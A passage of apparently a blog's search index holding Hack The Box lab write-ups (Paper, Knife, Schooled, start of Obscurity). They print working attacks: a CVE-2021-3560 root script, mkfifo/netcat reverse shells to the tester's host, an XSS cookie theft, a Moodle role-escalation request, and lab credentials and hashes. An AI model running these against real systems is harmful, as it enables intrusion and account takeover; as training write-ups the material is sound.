00:40 user.txt\ndrwxr-xr-x 2 dwight dwight 24 Sep 16 07:09 .vim\n-rw------- 1 dwight dwight 1757 Feb 14 15:17 .viminfo\n\n$ file ../hubot/.env\n&lt;!=====Contents of file ../hubot/.env=====&gt;\nexport ROCKETCHAT_URL='http://127.0.0.1:48320'\nexport ROCKETCHAT_USER=recyclops\nexport ROCKETCHAT_PASSWORD=Queenofblad3s!23\nexport ROCKETCHAT_USESSL=false\nexport RESPOND_TO_DM=true\nexport RESPOND_TO_EDITED=true\nexport PORT=8000\nexport BIND_ADDRESS=127.0.0.1\n&lt;!=====End of file ../hubot/.env=====&gt;\nLogin with found credentials: dwight:Queenofblad3s!23\nGrab user.txt\n[dwight@paper ~]$ cat user.txt \nc08f19a9c33103d08cc0273fda6e8497\n\n\n\n\nROOT\n\nStep 1\n\ndwight is not able to run commands as sudo.\n\n[dwight@paper tmp]$ netstat -antp\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:48320         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      2395/node           \ntcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      - \n./linpeas.sh\n[... snip ...]\n╔══════════╣ Sudo version\n╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version\nSudo version 1.8.29\n\nVulnerable to CVE-2021-3560\nGoogle for cve-2021-3560 github and we find a lot of POCs, download one and try it out. The exploit will work as intended, a user is created, however we are not able to login as that user. Instead, try to exploit it manually.\n\n“To avoid repeatedly triggering the authentication dialog box (which can be annoying), I recommend running the commands from an SSH session”\n\nManual exploit of CVE-2021-3560:\n[dwight@paper shm]$ ssh localhost\ndwight@localhosts password: Queenofblad3s!23\n\n[dwight@paper shm]$ time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:playerthree string:”PlayerThree” int32:1\n\nreal    0m0.007s\nuser    0m0.003s\nsys 0m0.003s\n[dwight@paper shm]$ time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:playerthree string:”PlayerThree” int32:1\n\nreal    0m0.006s\nuser    0m0.001s\nsys 0m0.004s\n[dwight@paper shm]$ time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:playerthree string:”PlayerThree” int32:1\n\nreal    0m0.007s\nuser    0m0.002s\nsys 0m0.004s\nThe time is around 6-7 milliseconds, meaning we need to kill the dbus-send command after approximately 3 milliseconds.\n[dwight@paper shm]$ for i in {1..50} ; do dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:playerthree string:”PlayerThree” int32:1 & sleep 0.003s ; kill $! ; done\n\n[dwight@paper shm]$ id playerthree\nuid=1005(playerthree) gid=1005(playerthree) groups=1005(playerthree),10(wheel)\n\n[dwight@paper shm]$ for i in {1..50} ; do dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string: string:GoldenEye & sleep 0.003s ; kill $! ; done\n\n[dwight@paper shm]$ su playerthree -c 'sudo su'\nPassword: \n[root@paper shm]# id\nuid=0(root) gid=0(root) groups=0(root)\n\n[root@paper shm]# cat /root/root.txt\n2db764e7dc2b0a27f33844524930ab83\n\n[root@paper shm]# cat /etc/shadow\nroot:$6$rfCS6Tb3sgIjkTux$UhBHq5wWPncgtVnltzm3Squ9KBcX3/9k0y6o8AG6lNSKOobHatUWFzPS1J8uuh/QML6kyhZ10ngXa5nCBLDkL.:18811:0:99999:7:::\ndwight:$6$xVlcDig.sohk9jK0$BZEhwP6SZytZTTAMTqjb35j02yMHq/F4jl3WPwqFCtsf0Cbce4pqo3PS8OGXiJdXGE/C4Y4yQZAmiT60wt9OQ/:18811:0:99999:7:::\nplayerthree::19039:0:99999:7:::\nNOTE: When creating the password, it must be set to blank else it wont work.\nA very simple bash script that does it all for you:\n[dwight@paper shm]$ cat root.sh \n#!/bin/bash\necho \"    - CVE-2021-3560 Exploit - \"\necho \" - Run script until it succeed -\"\nfor i in {1..50} ; do dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:playerthree string:”PlayerThree” int32:1 & sleep 0.003s ; kill $! ; done &gt; /dev/null 2&gt;&1\necho \"[+] Created account\"\nfor i in {1..50} ; do dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string: string:GoldenEye & sleep 0.003s 2&gt;&1 ; kill $! ; done &gt; /dev/null 2&gt;&1\necho \"[+] Set blank password (blank)\"\necho \"[+] Elevating to root..\"\nsu playerthree -c 'sudo su'\n[dwight@paper shm]$ ./root.sh \n    - CVE-2021-3560 Exploit - \n - Run script until it succeed -\n[+] Created account\n[+] Set blank password (blank)\n[+] Elevating to root..\nbash: cannot set terminal process group (583183): Inappropriate ioctl for device\nbash: no job control in this shell\n[root@paper shm]# id\nuid=0(root) gid=0(root) groups=0(root)\n\n\n\n\nReferences\n\nPolkit Privesc - CVE-2021-3560"
  },
  {
    "objectID": "posts/2021-05-25-htb-writeup-knife/2021-05-25-htb-writeup-knife.html",
    "href": "posts/2021-05-25-htb-writeup-knife/2021-05-25-htb-writeup-knife.html",
    "title": "Knife - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/knife]# nmap -Pn -n –open -sCV 10.10.10.242 (master✱) Host discovery disabled (-Pn). All addresses will be marked ‘up’ and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 10:51 CEST Nmap scan report for 10.10.10.242 Host is up (0.044s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA) | 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA) |_ 256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Emergent Medical Idea Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nDIRB: -\nNIKTO: + Retrieved x-powered-by header: PHP/8.1.0-dev\n\nBy looking at the website there’s not much we can do. No links, no nothing really. Going back the the enum data it’s sparse, but from Nikto we find PHP version 8.1.0-dev - which sounds interesting.\nGoogling around I came across an article mentioning 8.1.0-dev was released with a backdoor, making all sites using it vulnerable. Download a PoC script and run it to get a shell, and grab user.txt.\n[root:/git/htb/knife]# python3 backdoor_php8.1.0-dev.py (master✱) Enter the full host url: http://10.10.10.242\nInteractive shell is opened on http://10.10.10.242 Can’t access tty; job crontol turned off. $ hostname && id knife uid=1000(james) gid=1000(james) groups=1000(james)\n$ cat /home/james/user.txt 49e822672ec0b1f552fd10c37f815904\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nThe PoC-shell is limited so start by sending a new reverse shell;\n\n$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&1|nc 10.10.14.6 4488 &gt;/tmp/f\n[root:/git/htb/knife]# nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.6] from (UNKNOWN) [10.10.10.242] 59996 /bin/sh: 0: can’t access tty; job control turned off $\nUpgrade the shell.\n\nAs usual, start with ‘sudo -l’.\n\njames@knife:/$ sudo -l Matching Defaults entries for james on knife: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\nUser james may run the following commands on knife:\n    (root) NOPASSWD: /usr/bin/knife\nRunning the command we get a lot of help output, including an interesting exec option. james@knife:/$ sudo /usr/bin/knife .. ** EXEC COMMANDS ** knife exec [SCRIPT] (options)\nLooking at the knife binary we see that it’s ruby - so most likely a ruby script is the way to go here.\n\nUpload a ruby reverse shell and execute it. Capture the shell and grab root.txt.\n\njames@knife:/dev/shm$ wget http://10.10.14.6/rev.rb james@knife:/dev/shm$ chmod +x rev.rb james@knife:/dev/shm$ sudo /usr/bin/knife exec /dev/shm/rev.rb\n[root:/git/htb/knife]# nc -lvnp 4499 (master✱) listening on [any] 4499 … connect to [10.10.14.6] from (UNKNOWN) [10.10.10.242] 44298 We are connected! root@knife:/dev/shm# id && hostname && cat /root/root.txt uid=0(root) gid=0(root) groups=0(root) knife 8a3f41cb35cd8ca41e684e209e051a6c\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nPHP 8.1.0-dev backdoor: https://github.com/flast101/php-8.1.0-dev-backdoor-rce"
  },
  {
    "objectID": "posts/2021-05-07-htb-writeup-schooled/2021-05-07-htb-writeup-schooled.html",
    "href": "posts/2021-05-07-htb-writeup-schooled/2021-05-07-htb-writeup-schooled.html",
    "title": "Schooled - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/schooled]# nmap -Pn -n -sCV –open 10.10.10.234 (master✱) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0) | ssh-hostkey: | 2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA) | 256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA) |_ 256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519) 80/tcp open http Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15 |_http-title: Schooled - A new kind of educational institute Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd\n\nDIRB: ==&gt; DIRECTORY: http://10.10.10.234/css/ ==&gt; DIRECTORY: http://10.10.10.234/fonts/ ==&gt; DIRECTORY: http://10.10.10.234/images/ + http://10.10.10.234/index.html (CODE:200|SIZE:20750) ==&gt; DIRECTORY: http://10.10.10.234/js/\nNIKTO: + Allowed HTTP Methods: OPTIONS, HEAD, GET, POST, TRACE\n[root:/git/htb/schooled]# nmap -p- –open 10.10.10.234 (master✱) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 33060/tcp open mysqlx\n[root:/git/htb/schooled]# nmap -sU 10.10.10.234 (master✱) PORT STATE SERVICE 514/udp open|filtered syslog\n\nWe have a point of entry is through port 33060, mysqlx through services such as mysql-shell. Install snap and the snap package ‘mysql-shell’.\n\n[root:~]# systemctl start snapd.service [root:~]# systemctl status snapd.service [root:~]# snap install mysql-shell mysql-shell 8.0.23 from Canonical✓ installed\n[root:~]# /bin/bash root@nidus:~# mysqlsh MySQL Shell 8.0.23\nType ‘’ or ‘?’ for help; ‘’ to exit. mysql-py&gt; oot@schooled.htb Creating a session to ‘root@schooled.htb’ Please provide the password for ‘root@schooled.htb’: **** MySQL Error 1045: Access denied for user ‘root’@‘10.10.14.8’ (using password: YES)\nWe lack any credentials however, so continue to enumerate.\nEnumerate vhosts with gobuster: [root:/git/htb/schooled]# gobuster vhost -v -u http://schooled.htb -w /usr/share/wordlists/dirb/big.txt -o go-vhosts.txt [root:/git/htb/schooled]# cat go-vhosts.txt | grep Found: Found: moodle.schooled.htb (Status: 200) [Size: 84]\nWhile waiting for the results I found this interesting sentence on the homepage; ‘All content will be delivered over Moodle.’ Add moodle.schooled.htb in /etc/hosts.\n\nCreate a new account.\n\nUsername: testtest Password: Test123! Email: testtest@student.schooled.htb\nWe have the option to upload files, however it seem like we can’t execute them server side. Trying to access the uploaded file automatically trigger a download.\nEnroll to Mathematics course, from the announcements we find: &gt; This is a self enrollment course. For students who wish to attend my lectures be sure that you have your MoodleNet profile set. &gt; Students who do not set their MoodleNet profiles will be removed from the course before the course is due to start and I will be checking all students who are enrolled on this course. &gt; Look forward to seeing you all soon. &gt; Manuel Phillips\nGoing to our profile, and clicking ‘Edit Profile’ we have the option to specify ‘MoodleNet profile’, we can probably use this to create steal Manuel Phillips admin cookie.\nMoodleNet Profile:\n\n[root:/git/htb/schooled]# nc -lvnp 80 (master✱) listening on [any] 80 … connect to [10.10.14.8] from (UNKNOWN) [10.10.10.234] 42693 GET /?c=MoodleSession=rktqego8s482a68uaog926rpjl HTTP/1.1 Host: 10.10.14.8 User-Agent: Mozilla/5.0 (X11; FreeBSD amd64; rv:86.0) Gecko/20100101 Firefox/86.0 Accept: image/webp,/ Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Referer: http://moodle.schooled.htb/moodle/user/profile.php?id=29\nChange to the new MoodleSession cookie (rktqego8s482a68uaog926rpjl) in the Storage Settings (Shift + F9), go to dashboard to update and we are now logged in as Manuel Phillips.\n\nLooking around for vulnerabilities as a teacher I came across CVE-2020-14321, where we can escalate the teacher to a manager, and then upload a malicious plugin to get RCE. Sound good to me!\n\nFirst we need to find the manager, this can we simply do by going to your course (Maths) and press ‘Participants’. In the top right we find a cog, press that and in the bottom of the drop-down-list you see the option ‘Other Users’. Looking at Other Users we find ‘Lianne Carter’ with the Role ‘Manager (Assigned at site level)’.\nGo back enroll Lianne as a new student for the maths class. Before you press ‘Enroll user’, start up Burp Suite and capture the GET request - send it to the repeater.\nORIGINAL REQUEST: GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid=10&sesskey=KdOADdOd7H&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0&userlist%5B%5D=25&roletoassign=1&startdate=4&duration= HTTP/1.1 Host: moodle.schooled.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json X-Requested-With: XMLHttpRequest Connection: close Referer: http://moodle.schooled.htb/moodle/user/index.php?id=5 Cookie: MoodleSession=rktqego8s482a68uaog926rpjl\n\nChange the ‘userlist’-parameter from 25 (ID of Lianne) to Manuel’s ID, 24.\nChange the ‘roletoassign’ from 5, which I assume is student, to 1 - which is manager.\nSend the new request\n\nMODIFIED REQUEST: GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid=10&sesskey=KdOADdOd7H&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0&userlist%5B%5D=24&roletoassign=1&startdate=4&duration= HTTP/1.1 Host: moodle.schooled.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json X-Requested-With: XMLHttpRequest Connection: close Referer: http://moodle.schooled.htb/moodle/user/index.php?id=5 Cookie: MoodleSession=rktqego8s482a68uaog926rpjl\nRESPONSE: HTTP/1.1 200 OK Date: Fri, 07 May 2021 13:47:06 GMT Server: Apache/2.4.46 (FreeBSD) PHP/7.4.15 X-Powered-By: PHP/7.4.15 Expires: Mon, 20 Aug 1969 09:23:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Cache-Control: post-check=0, pre-check=0 Last-Modified: Fri, 07 May 2021 13:47:07 GMT Accept-Ranges: none Content-Length: 51 Connection: close Content-Type: application/json; charset=utf-8\n{“success”:true,“response”:{},“error”:““,”count”:1}\nWe get a success! We can now see in the list of Participants that we got both Lianne and Manuel as a Manager Role.\nFirst / Surname Email address Roles Groups Last access to course Lianne Carter carter_lianne@staff.schooled.htb Student, Manager No groups Never Manuel Phillips phillips_manuel@staff.schooled.htb Manager, Teacher No groups now\nPress on ‘Lianne Carter’ to go to her profile and within you’ll find Administration and ‘Log in as’. Press that and you’ll now have access as Lianne which gives us access to ‘Site administration’ in the left menu bar.\n\nGoing to ‘Site administration’ &gt; Plugins we notice that we don’t have any options available to upload a file.\n\nGo to Users &gt; Permission, Define Roles &gt; Manager &gt; Edit. Scroll down in the list of options and enable ‘Change site configuration’.\nGo back to Site administration &gt; Plugins and you’ll now have ‘Install plugins’ as an option.\nDownload rce.zip from ‘https://github.com/HoangKien1020/Moodle_RCE’ and upload it, press ‘Install plugin from ZIP file’. Moodle will validate the file and you have to press ‘Continue’.\nThe plugin should now be uploaded and installed. Quickly execute your exploit through the url as this is reset frequently. [root:/git/htb/schooled]# curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id (master✱) uid=80(www) gid=80(www) groups=80(www)\nTesting different one-line-reverse and I got netcat to work.\n[root:/git/htb/schooled]# curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.8%204488%20%3E%2Ftmp%2Ff [root:/git/htb/schooled]# nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.8] from (UNKNOWN) [10.10.10.234] 45345 sh: can’t access tty; job control turned off $ id uid=80(www) gid=80(www) groups=80(www) $ pwd /usr/local/www/apache24/data/moodle/blocks/rce/lang/en\n\nLets start by looking for sensitive files. Moodle use MySQL to store it’s userdata, so we can probably find a file containing MySQL creds.\n\n$ pwd /usr/local/www/apache24/data/moodle\n$ cat config.php dbtype = ‘mysqli’; $CFG-&gt;dblibrary = ‘native’; $CFG-&gt;dbhost = ‘localhost’; $CFG-&gt;dbname = ‘moodle’; $CFG-&gt;dbuser = ‘moodle’; $CFG-&gt;dbpass = ‘PlaybookMaster2020’; $CFG-&gt;prefix = ‘mdl_’; $CFG-&gt;dboptions = array ( ‘dbpersist’ =&gt; 0, ‘dbport’ =&gt; 3306, ‘dbsocket’ =&gt; ’‘, ’dbcollation’ =&gt; ‘utf8_unicode_ci’, );\nWe are unable to access mysql however; $ mysql /bin/sh: mysql: not found\nLooking in /etc/passwd we see that the users use ‘/bin/csh’, so we change to that and are now able to access mysql. mysql -D moodle -h localhost -u moodle -p Enter password: PlaybookMaster2020\nDumping the database and looking on the table mdl_user we find the admin hash (jamie’s hash), which is also on of our available users.\nmysqldump –databases moodle -h localhost -u moodle -p &gt; out.txt Enter password: PlaybookMaster2020\nls -al /usr/home total 26 drwxr-xr-x 4 root wheel 4 Mar 16 06:33 . drwxr-xr-x 16 root wheel 16 Feb 26 22:46 .. drwx—— 2 jamie jamie 11 Feb 28 18:13 jamie drwx—— 5 steve steve 14 Mar 17 14:05 steve\n[root:/git/htb/schooled]# cat mdl_user.txt | jamie ‘admin’,‘$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW’,’‘,’Jamie’,‘Borham’,‘jamie@staff.schooled.htb’\n\nCrack the (blowfish) hash, SSH in as jamie and grab user.txt\n\n[root:/git/htb/schooled]# hashcat -a0 -m3200 jamie.hash /usr/share/wordlists/rockyou.txt .. $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx\nSession……….: hashcat Status………..: Cracked Hash.Name……..: bcrypt \\(2*\\), Blowfish (Unix)\nCREDS = jamie:!QAZ2wsx\n[root:/git/htb/schooled]# ssh jamie@schooled.htb Password for jamie@Schooled: !QAZ2wsx .. jamie@Schooled:~ $ id uid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel)\njamie@Schooled:~ $ cat user.txt\n  7cb596a361cac653fbbc1c75665b5011\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nAs per usual we start with a ‘sudo -l’ hoping for a easy root.\n\njamie@Schooled:~ $ sudo -l User jamie may run the following commands on Schooled: (ALL) NOPASSWD: /usr/sbin/pkg update (ALL) NOPASSWD: /usr/sbin/pkg install *\nIt is pretty obvious that we should install a package with sudo privs to get root. Looking on gtfobins there’s an entry about ‘pkg’, follow it and modify to get the contents of /root/root.txt.\n[root:/opt/htb/schooled]# gem install fpm [root:/git/htb/schooled]# TF=$(mktemp -d) (master✱) [root:/git/htb/schooled]# echo ‘cat /root/root.txt’ &gt; $TF/x.sh (master✱) [root:/git/htb/schooled]# fpm -n x -s dir -t freebsd -a all –before-install $TF/x.sh $TF (master✱) DEPRECATION NOTICE: XZ::StreamWriter#close will automatically close the wrapped IO in the future. Use #finish to prevent that. /var/lib/gems/2.7.0/gems/ruby-xz-0.2.3/lib/xz/stream_writer.rb:185:in initialize'         /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:innew’ /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in block in output'         /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:inopen’ /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in output'         /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/command.rb:487:inexecute’ /var/lib/gems/2.7.0/gems/clamp-1.0.1/lib/clamp/command.rb:68:in run'         /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/command.rb:574:inrun’ /var/lib/gems/2.7.0/gems/clamp-1.0.1/lib/clamp/command.rb:133:in run'         /var/lib/gems/2.7.0/gems/fpm-1.12.0/bin/fpm:7:in&lt;top (required)&gt;’ /usr/local/bin/fpm:23:in load'         /usr/local/bin/fpm:23:in\n\n’ Created package {:path=&gt;“x-1.0.txz”}\n[root:/git/htb/schooled]# python3 -m http.server 80\njamie@Schooled:~ $ curl http://10.10.14.12/x-1.0.txz –output x-1.0.txz % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 472 100 472 0 0 6051 0 –:–:– –:–:– –:–:– 6051\njamie@Schooled:~ $ sudo pkg install -y –no-repo-update ./x-1.0.txz pkg: Repository FreeBSD has a wrong packagesite, need to re-create database pkg: Repository FreeBSD cannot be opened. ‘pkg update’ required Checking integrity… done (0 conflicting) The following 1 package(s) will be affected (of 0 checked):\nNew packages to be INSTALLED:\n    x: 1.0\n\nNumber of packages to be installed: 1\n[1/1] Installing x-1.0...\nbdf19103f786cf0b8a3be335ba0fabdf\nExtracting x-1.0: 100%\nReport the flag, done deal!\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nXSS Admin Cookie: https://infinitelogins.com/2020/10/13/using-cross-site-scripting-xss-to-steal-cookies/\nMoodle Teacher to RCE: https://github.com/HoangKien1020/CVE-2020-14321 https://www.youtube.com/watch?v=BkEInFI4oIU\nPkg privesc / root.txt: https://gtfobins.github.io/gtfobins/pkg/"
  },
  {
    "objectID": "posts/2019-12-12-htb-writeup-obscurity/2019-12-12-htb-writeup-obscurity.html",
    "href": "posts/2019-12-12-htb-writeup-obscurity/2019-12-12-htb-writeup-obscurity.html",
    "title": "Obscurity - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@kali:/opt/htb/machines/bitlab# nmapAutomatorDirb.sh 10.10.10.168 All 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA) | 256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA) |_ 256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519) 8080/tcp open http-proxy BadHTTPServer Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nDIRB\n\nhttp://10.10.10.168:8080/index.html (CODE:200|SIZE:4171)\n\nNIKTO\n\nServer: BadHTTPServer\n\nLooking on the website we find\n\n‘security through obscurity’; we write all our own software from scratch\nA custom written web server 70% (Currently resolving minor stability issues; server will restart if it hangs for 30 seconds)\nAn unbreakable encryption algorithm 85%\nA more secure replacement to SSH 95%\nto server devs: the current source code for the web server is in ‘SuperSecureServer.py’ in the secret development directory\n\nWe use ffuf to find the path to the source code SuperSecureServer.py root@p3:/opt# ffuf -c -w /usr/share/dirb/wordlists/common.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py\n     /'___\\  /'___\\           /'___\\\n    /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n    \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n     \\ \\ 